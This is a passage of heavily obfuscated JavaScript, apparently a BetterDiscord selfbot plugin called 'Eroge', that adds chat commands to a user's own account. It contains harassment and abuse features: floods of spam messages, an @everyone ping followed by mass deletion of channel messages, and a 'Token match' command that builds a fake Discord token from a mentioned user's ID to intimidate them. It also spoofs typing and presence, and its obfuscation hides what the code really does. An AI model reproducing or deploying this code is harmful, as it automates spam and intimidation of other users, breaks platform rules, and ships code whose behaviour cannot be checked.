          if (!sevion) return window.BdApi[abdrahman(1248)](abdrahman(1078), "You need mention someone. ❌");
          _0x1c3e17[abdrahman(590)]()[abdrahman(656)](meagen => {
            const versia = abdrahman;
            var cherrice = meagen;
            let lillybeth = (new sherae.RichEmbed)[versia(1044)](versia(471) + jillian[versia(887)].username + " *** pat pat *** " + sevion[versia(1423)] + versia(306))[versia(321)](COLOR).setImage(cherrice)[versia(938)](versia(899), IMAGE);
            lillybeth.setTimestamp(), jillian[versia(407)][versia(746)](lillybeth);
          });
        }
        if (jillian.content[abdrahman(1403)](PREFIX + "giveslap")) {
          const salandra = jillian.mentions.users[abdrahman(911)]();
          jillian[abdrahman(1289)]();
          if (!salandra) return window[abdrahman(987)][abdrahman(1248)]("🔪 Eroge Notification 🔪", abdrahman(1366));
          _0x1c3e17[abdrahman(842)]()[abdrahman(656)](marelis => {
            const ikeisha = abdrahman;
            var katalinna = marelis;
            let romella = (new sherae[ikeisha(344)])[ikeisha(1044)](ikeisha(1386) + jillian.author[ikeisha(1423)] + ikeisha(537) + salandra[ikeisha(1423)] + " 👋")[ikeisha(321)](COLOR)[ikeisha(1211)](katalinna)[ikeisha(938)](ikeisha(899), IMAGE);
            romella[ikeisha(1264)](), jillian.channel[ikeisha(746)](romella);
          });
        }
        jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(1458)) && (jillian.delete(), _0x1c3e17[abdrahman(1458)]()[abdrahman(656)](ryzen => {
          const verlon = abdrahman;
          var alleshia = ryzen;
          let odile = (new sherae[verlon(344)])[verlon(1044)](jillian[verlon(887)].username + verlon(623))[verlon(321)](COLOR)[verlon(1211)](alleshia).setFooter(verlon(899), IMAGE);
          odile[verlon(1264)](), jillian[verlon(407)][verlon(746)](odile);
        }));
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + "punch")) {
          const zaryan = jillian[abdrahman(726)][abdrahman(543)].first();
          jillian[abdrahman(1289)]();
          if (!zaryan) return window[abdrahman(987)][abdrahman(1248)](abdrahman(1078), "You need mention someone. ❌");
          _0x1c3e17[abdrahman(1013)]()[abdrahman(656)](shakeya => {
            const mykyla = abdrahman;
            var shaqula = shakeya;
            let rheia = (new sherae[mykyla(344)]).setTitle("👊 " + jillian[mykyla(887)][mykyla(1423)] + mykyla(406) + zaryan[mykyla(1423)] + mykyla(1019)).setColor(COLOR)[mykyla(1211)](shaqula).setFooter(mykyla(899), IMAGE);
            rheia[mykyla(1264)](), jillian[mykyla(407)][mykyla(746)](rheia);
          });
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(877))) {
          const seryn = jillian[abdrahman(726)].users[abdrahman(911)]();
          jillian.delete();
          if (!seryn) return window[abdrahman(987)].alert("🔪 Eroge Notification 🔪", "You need mention someone. ❌");
          _0x1c3e17.hug()[abdrahman(656)](trishona => {
            const schaeffer = abdrahman;
            var atika = trishona;
            let calsey = (new sherae[schaeffer(344)])[schaeffer(1044)]("🤗 " + jillian.author[schaeffer(1423)] + schaeffer(557) + seryn[schaeffer(1423)] + schaeffer(306))[schaeffer(321)](COLOR).setImage(atika)[schaeffer(938)](schaeffer(899), IMAGE);
            calsey.setTimestamp(), jillian[schaeffer(407)][schaeffer(746)](calsey);
          });
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(258))) {
          jillian.delete();
          const yaseer = [abdrahman(308), abdrahman(1335), "https://i.imgur.com/qLHi44a.gif", "https://i.imgur.com/vmg8wiK.gif"];
          let kiswanna = (new sherae.RichEmbed)[abdrahman(1044)](jillian[abdrahman(887)][abdrahman(1423)] + " want to suicide 😭🔫")[abdrahman(321)](COLOR)[abdrahman(1211)](yaseer[Math[abdrahman(250)](Math[abdrahman(1240)]() * yaseer[abdrahman(1108)])])[abdrahman(938)](abdrahman(899), IMAGE);
          kiswanna[abdrahman(1264)](), jillian[abdrahman(407)][abdrahman(746)](kiswanna);
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(1393))) {
          const mahsa = jillian[abdrahman(726)][abdrahman(543)].first();
          jillian[abdrahman(1289)]();
          if (!mahsa) return window[abdrahman(987)].alert(abdrahman(1078), abdrahman(1366));
          const zaxtyn = ["https://thumbs.gfycat.com/GlaringWetAsiandamselfly-size_restricted.gif", abdrahman(681), abdrahman(1066), abdrahman(1122), abdrahman(299), abdrahman(1237), abdrahman(1123), abdrahman(240)];
          let zamayra = (new sherae[abdrahman(344)])[abdrahman(1044)](jillian[abdrahman(887)].username + abdrahman(871) + mahsa[abdrahman(1423)] + " ")[abdrahman(321)](COLOR)[abdrahman(1211)](zaxtyn[Math[abdrahman(250)](Math.random() * zaxtyn[abdrahman(1108)])]).setFooter("🌸 𝙀𝙧𝙤𝙜𝙚 | Made by Misaki 🌸", IMAGE);
          zamayra[abdrahman(1264)](), jillian[abdrahman(407)][abdrahman(746)](zamayra);
        }
        if (jillian[abdrahman(393)].startsWith(PREFIX + abdrahman(668))) {
          let bilma = ["🦑", "🦐", "🦀", "🐚", "🐙", "🦈", "🐡", "🐠", "🐟", "🐬", "🐋", "🐳", "🐢"], mohana = Math.floor(Math[abdrahman(1240)]() * bilma[abdrahman(1108)]);
          var xochiquetzal = (new sherae.RichEmbed)[abdrahman(367)]("🐋 Fish")[abdrahman(321)](COLOR).addField(abdrahman(933), bilma[mohana])[abdrahman(938)](abdrahman(899), IMAGE);
          xochiquetzal[abdrahman(1264)](), jillian[abdrahman(407)].send(xochiquetzal);
        }
        jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(514)) && (jillian.delete(), _0x4d876d({uri: abdrahman(366), headers: {}, json: !![], method: abdrahman(875)}, function (breigha, karylle, gurbaaj) {
          const dolene = abdrahman;
          var tarik = karylle[dolene(759)][dolene(411)], mridula = (new sherae.RichEmbed)[dolene(1044)]("**Sad Cat**").setImage(tarik)[dolene(321)](COLOR)[dolene(938)](dolene(899), IMAGE);
          mridula.setTimestamp(), jillian.channel[dolene(746)](mridula);
        }));
        jillian.content[abdrahman(1403)](PREFIX + abdrahman(954)) && (jillian[abdrahman(1289)](), _0x4d876d({uri: abdrahman(1438), headers: {}, json: !![], method: "GET"}, function (ralphe, jamica, jaxon) {
          const ahsoka = abdrahman;
          var aadhavan = jamica[ahsoka(759)][ahsoka(581)], whitne = (new sherae[ahsoka(344)])[ahsoka(1044)]("**" + jillian.author[ahsoka(1423)] + ahsoka(720))[ahsoka(1211)](aadhavan)[ahsoka(321)](COLOR)[ahsoka(938)](ahsoka(899), IMAGE);
          whitne.setTimestamp(), jillian[ahsoka(407)][ahsoka(746)](whitne);
        }));
        if (jillian[abdrahman(393)].startsWith(PREFIX + abdrahman(550))) {
          const edwill = jillian[abdrahman(726)].users[abdrahman(911)]();
          jillian[abdrahman(1289)]();
          if (!edwill) return window[abdrahman(987)][abdrahman(1248)](abdrahman(1078), abdrahman(1366));
          var berend = (new sherae.RichEmbed)[abdrahman(1044)]("**" + jillian[abdrahman(887)][abdrahman(1423)] + abdrahman(1334) + edwill[abdrahman(1423)] + " to gay**")[abdrahman(1211)](abdrahman(622) + edwill[abdrahman(879)])[abdrahman(321)](COLOR)[abdrahman(938)](abdrahman(899), IMAGE);
          berend.setTimestamp(), jillian[abdrahman(407)][abdrahman(746)](berend);
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + "wasted")) {
          const kinli = jillian.mentions.users[abdrahman(911)]();
          jillian[abdrahman(1289)]();
          if (!kinli) return window[abdrahman(987)][abdrahman(1248)](abdrahman(1078), "You need mention someone. ❌");
          var berend = (new sherae[abdrahman(344)])[abdrahman(1044)]("**" + jillian[abdrahman(887)][abdrahman(1423)] + abdrahman(870) + kinli[abdrahman(1423)] + "**")[abdrahman(1211)]("https://some-random-api.ml/canvas/wasted?avatar=" + kinli[abdrahman(879)])[abdrahman(321)](COLOR).setFooter("🌸 𝙀𝙧𝙤𝙜𝙚 | Made by Misaki 🌸", IMAGE);
          berend[abdrahman(1264)](), jillian.channel[abdrahman(746)](berend);
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + "triggered")) {
          const arish = jillian[abdrahman(726)][abdrahman(543)][abdrahman(911)]();
          jillian[abdrahman(1289)]();
          if (!arish) return window.BdApi[abdrahman(1248)]("🔪 Eroge Notification 🔪", abdrahman(1366));
          var berend = (new sherae[abdrahman(344)])[abdrahman(1044)](abdrahman(1097)).setImage(abdrahman(1476) + arish[abdrahman(879)])[abdrahman(321)](COLOR)[abdrahman(938)]("🌸 𝙀𝙧𝙤𝙜𝙚 | Made by Misaki 🌸", IMAGE);
          berend[abdrahman(1264)](), jillian.channel[abdrahman(746)](berend);
        }
        if (jillian.content[abdrahman(1403)](PREFIX + "faketyping")) {
          if (matten === abdrahman(999)) matten = abdrahman(584), jillian[abdrahman(1289)](), window[abdrahman(987)][abdrahman(1248)](abdrahman(1078), abdrahman(645)), jillian.channel[abdrahman(395)](); else return matten = abdrahman(999), jillian[abdrahman(1289)](), window.BdApi[abdrahman(1248)](abdrahman(1078), "Fake typing disabled. ❌"), jillian[abdrahman(407)][abdrahman(1045)]();
        }
        jillian[abdrahman(393)][abdrahman(1403)](PREFIX + "annoying") && (jillian.delete(), jillian[abdrahman(407)][abdrahman(746)]("The Eiffel Tower (/ˈaɪfəl/ EYE-fəl; French: tour Eiffel [tuʁ‿ɛfɛl] (About this soundlisten)) is a wrought-iron lattice tower on the Champ de Mars in Paris, France. It is named after the engineer Gustave Eiffel, whose company designed and built the tower."), jillian[abdrahman(407)].send(abdrahman(1103)), jillian[abdrahman(407)][abdrahman(746)](abdrahman(1164)), jillian.channel[abdrahman(746)]("It was the first structure in the world to surpass both the 200 meter and 300 meter mark in height. Due to the addition of a broadcasting aerial at the top of the tower in 1957, it is now taller than the Chrysler Building by 5.2 metres (17 ft). Excluding transmitters, the Eiffel Tower is the second tallest free-standing structure in France after the Millau Viaduct."), jillian.channel[abdrahman(746)](abdrahman(1381)), jillian[abdrahman(407)][abdrahman(746)](abdrahman(453)), jillian[abdrahman(407)].send(abdrahman(1005)), jillian[abdrahman(407)][abdrahman(746)](abdrahman(447)), jillian[abdrahman(407)].send(abdrahman(960)), jillian.channel[abdrahman(746)]("The new version gained Eiffel's support: he bought the rights to the patent on the design which Koechlin, Nougier, and Sauvestre had taken out, and the design was exhibited at the Exhibition of Decorative Arts in the autumn of 1884 under the company name. On 30 March 1885, Eiffel presented his plans to the Société des Ingénieurs Civils; after discussing the technical problems and emphasising the practical uses of the tower, he finished his talk by saying the tower would symbolise:"), jillian[abdrahman(407)].send("n]ot only the art of the modern engineer, but also the century of Industrand Science in which we are living, and for which the way was prepared by the great scientific movement of the eighteenth century and by the Revolution of 1789, to which this monument will be built as an expression of France's gratitude."), jillian.channel[abdrahman(746)]("Little progress was made until 1886, when Jules Grévy was re-elected as president of France and Édouard Lockroy was appointed as minister for trade. A budget for the exposition was passed and, on 1 May, Lockroy announced an alteration to the terms of the open competition being held for a centrepiece to the exposition, which effectively made the selection of Eiffel's design a foregone conclusion, as entries had to include a study for a 300 m (980 ft) four-sided metal tower on the Champ de Mars."));
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(364))) {
          const zearl = jillian.mentions[abdrahman(543)][abdrahman(911)]();
          jillian[abdrahman(1289)]();
          if (!zearl) return window.BdApi[abdrahman(1248)](abdrahman(1078), abdrahman(768));
          var yaeno = zearl[abdrahman(1423)];
          _0xe6e37f(abdrahman(1182))[abdrahman(656)](lauretta => lauretta.text())[abdrahman(656)](shervon => jillian[abdrahman(407)][abdrahman(746)](yaeno + shervon));
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(1223))) {
          let jiraiyah = jillian.guild;
          if (!jiraiyah) return window[abdrahman(987)][abdrahman(1248)](abdrahman(1078), abdrahman(750));
          jillian.delete(), jillian[abdrahman(407)][abdrahman(746)]("@everyone"), jillian[abdrahman(407)][abdrahman(1406)]({limit: Math[abdrahman(858)](1, 100, 200)})[abdrahman(656)](smith => {
            const niriyah = abdrahman;
            smith[niriyah(1026)](gokul => {
              const niviah = niriyah;
              gokul[niviah(1289)]().catch(console[niviah(758)]);
            });
          });
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + "clean")) {
          jillian[abdrahman(1289)]();
          const devontrey = abdrahman(1276), cali = abdrahman(785);
          jillian.channel[abdrahman(746)](devontrey), jillian.channel[abdrahman(746)](cali), jillian[abdrahman(407)][abdrahman(746)](devontrey), jillian.channel[abdrahman(746)](cali), jillian.channel[abdrahman(746)](devontrey), jillian[abdrahman(407)][abdrahman(746)](cali), jillian[abdrahman(407)][abdrahman(746)](devontrey), jillian[abdrahman(407)][abdrahman(746)](cali), jillian.channel[abdrahman(746)](devontrey), jillian[abdrahman(407)].send(cali), jillian[abdrahman(407)][abdrahman(746)](devontrey), jillian[abdrahman(407)].send(cali), jillian[abdrahman(407)][abdrahman(746)](devontrey), jillian[abdrahman(407)].send(cali), jillian[abdrahman(407)][abdrahman(746)](devontrey), jillian[abdrahman(407)].send(cali);
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(732))) {
          const rashamel = jillian[abdrahman(726)][abdrahman(543)].first();
          jillian[abdrahman(1289)]();
          if (!rashamel) return window[abdrahman(987)].alert(abdrahman(1078), abdrahman(768));
          let joshuwa = [abdrahman(509), "XnyXiA", abdrahman(634), abdrahman(1041), abdrahman(811)], teressia = [abdrahman(1410), abdrahman(1091), "3_6Xt2k4OieDKimnNYGWUq9vJRo", abdrahman(1069)];
          var zaion = rashamel.id, aubriannah = _0xd5693d[abdrahman(625)](zaion), jaquarion = _0x26f764[abdrahman(625)](aubriannah);
          let bethannie = (new sherae[abdrahman(344)])[abdrahman(321)](COLOR).setTitle("Token match " + rashamel[abdrahman(1423)] + "")[abdrahman(457)]("" + jaquarion + "." + joshuwa[Math.floor(Math[abdrahman(1240)]() * ["HircHg", "XnyXiA", "XluxwQ", abdrahman(1041), "Xiq-WQ"][abdrahman(1108)])] + "." + teressia[Math[abdrahman(250)](Math.random() * [abdrahman(1410), abdrahman(1091), abdrahman(565), abdrahman(1069)][abdrahman(1108)])] + "");
          jillian[abdrahman(407)].send(bethannie);
        }
        if (jillian.content[abdrahman(1403)](PREFIX + "editedmsg")) {
          const kathaleya = abdrahman(1155);
          jillian[abdrahman(930)](kathaleya);
        }
        if (jillian.content.startsWith(PREFIX + "threats")) {
          const roxanna = jillian[abdrahman(726)][abdrahman(543)][abdrahman(911)]();
          jillian[abdrahman(1289)]();
          if (!roxanna) return window[abdrahman(987)].alert(abdrahman(1078), abdrahman(768));
          chakara();
          async function chakara() {
            const dereth = abdrahman;
            let ruffus = await _0x3857f[dereth(1107)](dereth(1305), {url: roxanna[dereth(879)]});
            cirrus(1e3);
            let burnadette = (new sherae[dereth(344)])[dereth(321)](COLOR).setImage(ruffus)[dereth(938)](dereth(899), IMAGE);
            burnadette[dereth(1264)](), jillian[dereth(407)].send(burnadette);
          }
        }
        if (jillian[abdrahman(393)].startsWith(PREFIX + abdrahman(863))) {
          const yuri = jillian[abdrahman(726)][abdrahman(543)].first();
          jillian.delete();
          if (!yuri) return window[abdrahman(987)][abdrahman(1248)](abdrahman(1078), "Sorry, you need mention someone. ❌");
          netisha();
          async function netisha() {
            const turhan = abdrahman;
            let abdisalam = await _0x3857f.generate("trap", {author: turhan(521), image: yuri[turhan(879)], name: yuri[turhan(1423)]});
            cirrus(1e3);
            let blayse = (new sherae[turhan(344)]).setColor(COLOR)[turhan(1211)](abdisalam)[turhan(938)](turhan(899), IMAGE);
            blayse[turhan(1264)](), jillian[turhan(407)][turhan(746)](blayse);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(1244))) {
          const kwana = jillian[abdrahman(726)][abdrahman(543)][abdrahman(911)]();
          jillian[abdrahman(1289)]();
          if (!kwana) return window[abdrahman(987)].alert(abdrahman(1078), abdrahman(768));
          carl();
          async function carl() {
            const lyly = abdrahman;
            let koleton = await _0x3857f[lyly(1107)](lyly(1244), {url: kwana.avatarURL});
            cirrus(1e3);
            let mahmud = (new sherae.RichEmbed)[lyly(321)](COLOR)[lyly(1211)](koleton)[lyly(938)](lyly(899), IMAGE);
            mahmud[lyly(1264)](), jillian[lyly(407)][lyly(746)](mahmud);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(946))) {
          const shermona = jillian.mentions[abdrahman(543)][abdrahman(911)]();
          let stephanie = maverick[abdrahman(1063)](1)[abdrahman(463)](" ");
          jillian.delete();
          if (!shermona) return window[abdrahman(987)][abdrahman(1248)]("🔪 Eroge Notification 🔪", abdrahman(768));
          if (!stephanie) return window.BdApi.alert(abdrahman(1078), abdrahman(570));
          daejion();
          async function daejion() {
            const kitra = abdrahman;
            let atoria = await _0x3857f[kitra(1107)](kitra(946), {text: stephanie, username: shermona[kitra(1423)]});
            cirrus(1e3);
            let nevelle = (new sherae[kitra(344)])[kitra(321)](COLOR)[kitra(1211)](atoria)[kitra(938)](kitra(899), IMAGE);
            nevelle.setTimestamp(), jillian[kitra(407)][kitra(746)](nevelle);
          }
        }
        if (jillian[abdrahman(393)].startsWith(PREFIX + "whowouldwin")) {
          const jagar = jillian[abdrahman(726)][abdrahman(543)][abdrahman(911)]();
          jillian[abdrahman(1289)]();
          if (!jagar) return window[abdrahman(987)][abdrahman(1248)](abdrahman(1078), abdrahman(768));
          marleena();
          async function marleena() {
            const shabrika = abdrahman;
            let thawann = await _0x3857f[shabrika(1107)](shabrika(690), {user1: shadarria[shabrika(1417)][shabrika(879)], user2: jagar.avatarURL});
            cirrus(1e3);
            let demar = (new sherae[shabrika(344)])[shabrika(321)](COLOR)[shabrika(1211)](thawann).setFooter(shabrika(899), IMAGE);
            demar[shabrika(1264)](), jillian[shabrika(407)][shabrika(746)](demar);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(988))) {
          var clowie = [abdrahman(779), abdrahman(562), "https://i.imgur.com/YXmmtSZ.mp4", abdrahman(1398), abdrahman(1112), abdrahman(1379), abdrahman(298), abdrahman(1079), abdrahman(788), abdrahman(1309), "https://i.imgur.com/23kI7CE.jpg", "https://i.imgur.com/nvFExTD.jpg", "https://i.imgur.com/fl0X0my.png", abdrahman(1121), "https://i.imgur.com/c41ubO7.jpg", "https://i.imgur.com/8ZsIe9I.png", abdrahman(499), abdrahman(1216)][Math.floor(Math[abdrahman(1240)]() * 18)];
          jillian[abdrahman(1289)]();
          let scherri = (new sherae.RichEmbed)[abdrahman(1044)](abdrahman(935)).setColor(COLOR)[abdrahman(1211)](clowie)[abdrahman(938)](abdrahman(899), IMAGE);
          scherri[abdrahman(1264)](), jillian[abdrahman(407)].send(scherri);
          var jden = ["1", "2", "3", "4", "5", "6"][Math[abdrahman(250)](Math.random() * 6)];
          tajmir.getRpcImage(abdrahman(1047), jden).then(viviann => {
            const isley = abdrahman;
            let damel = (new tajmir[isley(1474)]).setName(isley(252))[isley(798)](isley(1408)).setType(isley(309)).setApplicationId("885500353053859880").setAssetsLargeImage(viviann.id).setAssetsLargeText(isley(252)).setState("𝙀𝙧𝙤𝙜𝙚 𝙋𝙡𝙪𝙜𝙞𝙣");
            shadarria[isley(1417)].setPresence(damel[isley(234)]());
          })[abdrahman(652)](console.error);
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + "approved")) {
          jillian.delete();
          const kalena = jillian[abdrahman(726)][abdrahman(543)][abdrahman(911)]();
          if (!kalena) return window[abdrahman(987)].alert(abdrahman(1078), abdrahman(768));
          kennady();
          async function kennady() {
            const carolina = abdrahman;
            let valborg = zysean[carolina(1107)](carolina(618), {url: kalena.avatarURL})[carolina(656)](angilina => {
              const armonta = carolina;
              jillian[armonta(407)][armonta(746)]({files: [{attachment: angilina, name: armonta(979)}]});
            });
          }
        }
        jillian[abdrahman(393)].startsWith(PREFIX + abdrahman(1259)) && (setTimeout(function () {
          const olabode = abdrahman;
          jillian[olabode(930)]("1");
        }, 1e3), setTimeout(function () {
          const wyndi = abdrahman;
          jillian[wyndi(930)]("2");
        }, 2e3), setTimeout(function () {
          const caeser = abdrahman;
          jillian[caeser(930)]("3");
        }, 3e3), setTimeout(function () {
          jillian.edit("4");
        }, 4e3), setTimeout(function () {
          const miamore = abdrahman;
          jillian[miamore(930)]("5");
        }, 5e3), setTimeout(function () {
          const eulan = abdrahman;
          jillian[eulan(930)]("6");
        }, 6e3), setTimeout(function () {
          const caydenn = abdrahman;
          jillian[caydenn(930)]("7");
        }, 7e3), setTimeout(function () {
          jillian.edit("8");
        }, 8e3), setTimeout(function () {
          const salayna = abdrahman;
          jillian[salayna(930)]("9");
        }, 9e3), setTimeout(function () {
          const claudette = abdrahman;
          jillian.edit(claudette(1333));
        }, 1e4));
        if (jillian.content[abdrahman(1403)](PREFIX + abdrahman(1277))) {
          jillian.delete();
          const mathue = (new sherae[abdrahman(344)])[abdrahman(1044)](abdrahman(232) + maithili + abdrahman(1154) + maithili + abdrahman(613)).setThumbnail(shadarria.user[abdrahman(574)])[abdrahman(457)]("```      " + maithili + abdrahman(506) + maithili + "```").setColor(COLOR)[abdrahman(695)](abdrahman(972) + PREFIX + abdrahman(1105), abdrahman(1285))[abdrahman(695)](abdrahman(972) + PREFIX + abdrahman(1010), abdrahman(767))[abdrahman(695)](abdrahman(972) + PREFIX + abdrahman(269), abdrahman(603))[abdrahman(695)]("**```" + PREFIX + abdrahman(379), abdrahman(345))[abdrahman(695)](abdrahman(972) + PREFIX + abdrahman(1192), abdrahman(1031))[abdrahman(695)](abdrahman(972) + PREFIX + abdrahman(451), "***Change every text to ascii.***").addField(abdrahman(972) + PREFIX + abdrahman(1452), abdrahman(1246))[abdrahman(695)](abdrahman(972) + PREFIX + abdrahman(1397), abdrahman(892))[abdrahman(695)](abdrahman(972) + PREFIX + "autored ```**", abdrahman(605)).addField(abdrahman(972) + PREFIX + "autogreen ```**", abdrahman(780)).addField("**```" + PREFIX + abdrahman(572), "***Transform your text to yellow.***").addField("**```" + PREFIX + abdrahman(771), "***Transform your text to orange.***")[abdrahman(695)](abdrahman(972) + PREFIX + abdrahman(1205), "***Transform your text to blue.***")[abdrahman(695)]("**```" + PREFIX + "underline + TEXT ```**", abdrahman(1293))[abdrahman(695)](abdrahman(972) + PREFIX + "bold + TEXT ```**", abdrahman(841))[abdrahman(695)](abdrahman(972) + PREFIX + abdrahman(1141), abdrahman(554)).addField(abdrahman(972) + PREFIX + abdrahman(445), abdrahman(417))[abdrahman(695)](abdrahman(972) + PREFIX + abdrahman(869), "***Send a messsage on yellow without the ping (server only).***").addField("**```" + PREFIX + abdrahman(1367), "***Send a message on yellow without the ping (DM only).***")[abdrahman(695)](abdrahman(972) + PREFIX + abdrahman(1392), "***...***")[abdrahman(695)](abdrahman(972) + PREFIX + abdrahman(1465), abdrahman(896))[abdrahman(695)]("**```" + PREFIX + abdrahman(922), "***Send a ascii art of a ahegao face***")[abdrahman(695)](abdrahman(972) + PREFIX + abdrahman(945), abdrahman(1132))[abdrahman(695)](abdrahman(972) + PREFIX + abdrahman(1149), abdrahman(756))[abdrahman(695)](abdrahman(972) + PREFIX + abdrahman(1360), abdrahman(1096)), mekyle = (new sherae.RichEmbed)[abdrahman(321)](COLOR)[abdrahman(695)](abdrahman(972) + PREFIX + abdrahman(633), abdrahman(1081))[abdrahman(695)](abdrahman(972) + PREFIX + abdrahman(1297), abdrahman(797))[abdrahman(695)]("**```" + PREFIX + abdrahman(1357), abdrahman(1114)).addField(abdrahman(972) + PREFIX + "cursedcat ```**", abdrahman(1288))[abdrahman(695)](abdrahman(972) + PREFIX + abdrahman(1444), abdrahman(1234)).addField(abdrahman(972) + PREFIX + abdrahman(436), abdrahman(408)).addField(abdrahman(972) + PREFIX + abdrahman(591), "***Send a ascii art of middle finger.***")[abdrahman(695)](abdrahman(972) + PREFIX + "aperocket ```**", abdrahman(1195))[abdrahman(695)](abdrahman(972) + PREFIX + "buffdoge ```**", "***Send a ascii art of buff doge.***")[abdrahman(695)]("**```" + PREFIX + "girlbruh ```**", abdrahman(1062))[abdrahman(695)](abdrahman(972) + PREFIX + abdrahman(900), "***Send a ascii art of a anime ass.***")[abdrahman(695)](abdrahman(972) + PREFIX + abdrahman(865), abdrahman(831))[abdrahman(695)](abdrahman(972) + PREFIX + abdrahman(1461), abdrahman(526))[abdrahman(695)](abdrahman(972) + PREFIX + abdrahman(489), "***Send a ascii art of the when the impostor is sus V2.***")[abdrahman(695)](abdrahman(972) + PREFIX + abdrahman(268), abdrahman(836))[abdrahman(695)]("**```" + PREFIX + abdrahman(727), abdrahman(474))[abdrahman(1211)](IMAGE)[abdrahman(938)]("🌸 𝙀𝙧𝙤𝙜𝙚 | Made by Misaki 🌸", IMAGE);
          mathue[abdrahman(1264)](), jillian[abdrahman(407)].send(mathue), jillian[abdrahman(407)][abdrahman(746)](mekyle), BdApi[abdrahman(1150)](abdrahman(950), {type: abdrahman(1382)});
        }
        jillian[abdrahman(393)][abdrahman(1403)](PREFIX + "autospoiler") && (cythia === abdrahman(360) ? (cythia = "on", jillian[abdrahman(1289)](), window[abdrahman(987)].alert(abdrahman(1078), abdrahman(585))) : (cythia = abdrahman(360), jillian[abdrahman(1289)](), window[abdrahman(987)].alert(abdrahman(1078), "Auto Spoiler mode disabled. ❌")));
        jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(952)) && (meyah === abdrahman(360) ? (meyah = "on", jillian[abdrahman(1289)](), window[abdrahman(987)][abdrahman(1248)](abdrahman(1078), abdrahman(437))) : (meyah = abdrahman(360), jillian[abdrahman(1289)](), window[abdrahman(987)][abdrahman(1248)]("🔪 Eroge Notification 🔪", abdrahman(1311))));
        jillian.content.startsWith(PREFIX + "autoinfo") && (quasia === abdrahman(360) ? (quasia = "on", jillian.delete(), window[abdrahman(987)].alert("🔪 Eroge Notification 🔪", "Auto Info mode enabled. ✅")) : (quasia = "off", jillian[abdrahman(1289)](), window.BdApi.alert("🔪 Eroge Notification 🔪", abdrahman(989))));
        jillian[abdrahman(393)].startsWith(PREFIX + abdrahman(1385)) && (jayvonn === "off" ? (jayvonn = "on", jillian[abdrahman(1289)](), window.BdApi.alert(abdrahman(1078), abdrahman(621))) : (jayvonn = "off", jillian[abdrahman(1289)](), window.BdApi[abdrahman(1248)]("🔪 Eroge Notification 🔪", abdrahman(1073))));
        jillian[abdrahman(393)].startsWith(PREFIX + abdrahman(665)) && (everlena === abdrahman(360) ? (everlena = "on", jillian[abdrahman(1289)](), window[abdrahman(987)][abdrahman(1248)](abdrahman(1078), abdrahman(355))) : (everlena = abdrahman(360), jillian[abdrahman(1289)](), window[abdrahman(987)][abdrahman(1248)](abdrahman(1078), "Auto Yifive mode disabled. ❌")));
        if (jillian[abdrahman(393)].startsWith(PREFIX + abdrahman(1080))) {
          jillian[abdrahman(1289)]();
          if (!maverick[abdrahman(463)](" ")) return window.BdApi[abdrahman(1248)](abdrahman(1078), abdrahman(823));
          jesica(maverick.join(" "), (wishard, amandalynn) => {
            const melady = abdrahman;
            jillian[melady(407)][melady(746)](amandalynn, {code: melady(1080)});
          });
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + "reverse")) {
          jillian[abdrahman(1289)]();
          if (!maverick[abdrahman(463)](" ")) return window[abdrahman(987)][abdrahman(1248)](abdrahman(1078), "You need enter a message. ❌");
          const italia = maverick[abdrahman(463)](" "), jillion = italia.split("")[abdrahman(772)]().join("");
          jillian[abdrahman(407)][abdrahman(746)]("᠎" + jillion);
        }
        if (jillian.content.startsWith(PREFIX + "autocyan")) return roxeann === abdrahman(360) ? (roxeann = "on", jillian[abdrahman(1289)](), window[abdrahman(987)][abdrahman(1248)](abdrahman(1078), abdrahman(689))) : (roxeann = "off", jillian[abdrahman(1289)](), window[abdrahman(987)].alert(abdrahman(1078), abdrahman(993)));
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(1431))) return cosma === abdrahman(360) ? (cosma = "on", jillian[abdrahman(1289)](), window.BdApi[abdrahman(1248)]("🔪 Eroge Notification 🔪", abdrahman(270))) : (cosma = abdrahman(360), jillian[abdrahman(1289)](), window[abdrahman(987)][abdrahman(1248)](abdrahman(1078), abdrahman(300)));
        if (jillian[abdrahman(393)].startsWith(PREFIX + "autogreen")) return lushawn === abdrahman(360) ? (lushawn = "on", jillian[abdrahman(1289)](), window[abdrahman(987)].alert(abdrahman(1078), abdrahman(1428))) : (lushawn = abdrahman(360), jillian[abdrahman(1289)](), window[abdrahman(987)][abdrahman(1248)](abdrahman(1078), "Auto Green Text mode disabled. ❌"));
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + "autoyellow")) return torean === "off" ? (torean = "on", jillian[abdrahman(1289)](), window[abdrahman(987)][abdrahman(1248)](abdrahman(1078), abdrahman(1377))) : (torean = "off", jillian[abdrahman(1289)](), window[abdrahman(987)][abdrahman(1248)](abdrahman(1078), abdrahman(706)));
        if (jillian[abdrahman(393)].startsWith(PREFIX + abdrahman(670))) return lizardo === "off" ? (lizardo = "on", jillian[abdrahman(1289)](), window.BdApi[abdrahman(1248)](abdrahman(1078), "Auto Orange Text mode enabled. ✅")) : (lizardo = abdrahman(360), jillian[abdrahman(1289)](), window[abdrahman(987)].alert(abdrahman(1078), abdrahman(660)));
